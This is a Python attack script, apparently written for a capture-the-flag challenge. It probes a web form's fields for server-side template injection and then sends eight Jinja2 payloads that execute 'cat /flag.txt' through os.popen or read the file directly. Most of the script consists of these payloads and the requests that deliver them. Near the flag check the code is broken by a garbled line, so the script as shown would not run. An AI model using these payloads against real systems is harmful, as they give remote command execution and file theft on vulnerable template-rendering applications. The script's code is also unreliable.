#!/usr/bin/env python3
"""
Script to test SSTI vulnerability and extract flag from cpp.bootupctf.net:8095
"""

import requests
import re
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_ssti_and_get_flag():
    base_url = "https://cpp.bootupctf.net:8095/"
    
    # First, get the main page to see the form
    print("üîç Fetching main page...")
    response = requests.get(base_url, verify=False, timeout=10)
    print(f"Status Code: {response.status_code}")
    print(f"Content preview:\n{response.text[:500]}...")
    
    # Look for form elements
    form_action = re.search(r'<form[^>]*action="([^"]*)"', response.text)
    if form_action:
        action = form_action.group(1)
        if not action.startswith('http'):
            action = urljoin(base_url, action)
    else:
        action = base_url
    
    print(f"\nüìù Form action: {action}")
    
    # Test SSTI with {7*7}
    print("\nüß™ Testing SSTI with {7*7}...")
    
    # Try different form field names that might exist
    possible_fields = ['username', 'user', 'name', 'login', 'email']
    
    for field_name in possible_fields:
        print(f"\nüî¨ Trying field name: {field_name}")
        
        # Test with POST request
        data = {field_name: '{7*7}'}
        try:
            response = requests.post(action, data=data)
            print(f"POST Response Code: {response.status_code}")
            
            if '49' in response.text:
                print("üéØ SSTI detected! {7*7} evaluated to 49")
                print(f"Response contains: {response.text}")
                
                # Now try to read /flag.txt
                print("\nüöÄ Attempting to read /flag.txt...")
                
                # Common SSTI payloads for file reading
                payloads = [
                    "{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /flag.txt').read() }}",
                    "{% set cmd = 'cat /flag.txt' %}{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen(cmd).read() }}",
                    "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}",
                    "{{ ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/flag.txt').read() }}",
                    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/flag.txt').read() }}",
                    "{%set a=lipsum.__globals__%}{%print(a.os.popen('cat /flag.txt').read())%}",
                    "{{ lipsum.__globals__.os.popen('cat /flag.txt').read() }}",
                    "{{ ''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/flag.txt','r').read() }}"
                ]
                
                for payload in payloads:
                    print(f"\nüîç Trying payload: {payload[:50]}...")
                    data = {field_name: payload}
                    try:
                        response = requests.post(action, data=data)
                        if '[REDACTED]")
                            return
                        elif len(response.text) > 100 and response.text != "Invalid credentials":
                            print(f"Interesting response: {response.text[:200]}...")
                    except Exception as e:
                        print(f"Error with payload: {e}")
                
                return
            else:
                print(f"Response: {response.text[:200]}...")
                
        except Exception as e:
            print(f"Error with POST: {e}")
        
        # Also try GET request with parameter
        try:
            response = requests.get(action, params={field_name: '{7*7}'})
            print(f"GET Response Code: {response.status_code}")
            if '49' in response.text:
                print("üéØ SSTI detected via GET! {7*7} evaluated to 49")
                print(f"Response: {response.text}")
        except Exception as e:
            print(f"Error with GET: {e}")

if __name__ == "__main__":
    test_ssti_and_get_flag()
